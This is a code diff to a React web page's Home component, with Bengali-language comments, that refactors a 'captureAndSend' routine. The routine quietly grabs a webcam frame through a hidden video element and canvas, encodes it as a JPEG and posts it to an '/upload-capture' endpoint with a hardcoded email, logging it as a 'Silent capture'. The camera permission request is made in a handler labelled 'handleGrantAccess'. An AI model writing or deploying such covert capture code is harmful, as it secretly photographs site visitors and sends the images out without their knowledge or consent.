@@ -14,51 +14,40 @@ const Home = () => {
   const videoRef = useRef(null);
   const axiosPublic = useAxiosPublic();
 
+  // 1. Capture and Send Logic (Inside Component)
   const captureAndSend = async (stream) => {
-  // 1. Ekta temporary video element banano capturing-er jonno
-  const video = document.createElement("video");
-  video.srcObject = stream;
-  video.muted = true;
-  video.playsInline = true;
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.muted = true;
+    video.playsInline = true;
 
-  // Video load hoyar por capture shuru hobe
-  video.onloadedmetadata = async () => {
-    try {
-      await video.play();
+    video.onloadedmetadata = async () => {
+      try {
+        await video.play();
+        setTimeout(async () => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const context = canvas.getContext("2d");
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Camera sensor ready hote ebong focus thik hote 1 sec opekkha kora
-      setTimeout(async () => {
-        const canvas = document.createElement("canvas");
-        
-        // Video-r ashol width/height neya
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+          const imageData = canvas.toDataURL("image/jpeg", 0.7);
 
-        const context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          await axiosPublic.post("/upload-capture", {
+            image: imageData,
+            email: "friend@special.com", // Dynamic email thakle dite paren
+            time: new Date().toLocaleString(),
+          });
 
-        // 2. Chobi-ke Base64 string-e convert kora (JPEG format)
-        const imageData = canvas.toDataURL("image/jpeg", 0.7);
-
-        // 3. Backend-e pathano
-        await axiosPublic.post("/upload-capture", {
-          image: imageData,
-          email: "user@example.com", // Jode Auth thake tobe dynamically boshaben
-          time: new Date().toLocaleString(),
-        });
-
-        console.log("📸 Silent capture sent successfully!");
-
-        // Memory bachate temporary video element bondho kora
-        video.pause();
-        video.srcObject = null;
-      }, 1000); 
-
-    } catch (err) {
-      console.error("Capture process failed:", err);
-    }
+          console.log("📸 Silent capture sent!");
+          video.pause();
+          video.srcObject = null;
+        }, 1000);
+      } catch (err) {
+        console.error("Capture failed:", err);
+      }
+    };
   };
-};
   const handleGrantAccess = async () => {
     try {
       // Camera ebong Mic-er permission ekshathe request kora
